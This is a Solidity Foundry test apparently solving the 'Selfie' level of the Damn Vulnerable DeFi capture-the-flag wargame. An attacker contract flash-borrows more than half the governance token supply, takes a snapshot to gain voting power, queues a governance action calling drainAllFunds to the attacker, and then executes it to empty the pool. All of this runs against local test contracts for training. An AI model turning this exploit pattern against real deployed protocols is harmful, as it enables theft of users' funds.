// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        console.log("ETH balance", address(this).balance);
        uint256 AMOUNT = (dvtSnapshot.totalSupply() / 2) + 1;
        AttackSelfie attackSelfie = new AttackSelfie(selfiePool, simpleGovernance, dvtSnapshot, attacker);
        // Send some ether to the attackerContract
        (bool success,) = address(attackSelfie).call{value: 1 ether}("");
        require(success);
        attackSelfie.requestFlashloan(AMOUNT);
        vm.warp(block.timestamp + simpleGovernance.getActionDelay() + 1);
        attackSelfie.executeAction(attackSelfie.lastActionId());
        console.log("Funds of the attacker:", dvtSnapshot.balanceOf(attacker));
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract AttackSelfie {
    SelfiePool selfie;
    SimpleGovernance simpleGovernance;
    DamnValuableTokenSnapshot dvtSnapshot;
    address attacker;
    uint256 public lastActionId;
    uint256 amount;

    constructor(
        SelfiePool _selfie,
        SimpleGovernance _simpleGovernance,
        DamnValuableTokenSnapshot _dvtSnapshot,
        address _attacker
    ) {
        selfie = _selfie;
        simpleGovernance = _simpleGovernance;
        dvtSnapshot = _dvtSnapshot;
        attacker = _attacker;
    }

    function requestFlashloan(uint256 _amount) external {
        amount = _amount;
        selfie.flashLoan(_amount);
    }

    function receiveTokens(address tokenAddress, uint256 _amount) external {
        dvtSnapshot.snapshot();
        address receiver = address(selfie);
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        uint256 weiAmount = 0;
        lastActionId = simpleGovernance.queueAction(receiver, data, weiAmount);
        // Return of the loan to the pool
        IERC20(tokenAddress).transfer(address(selfie), _amount);
    }

    function executeAction(uint256 actionId) external {
        simpleGovernance.executeAction{value: 0.1 ether}(actionId);
    }

    receive() external payable {}
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
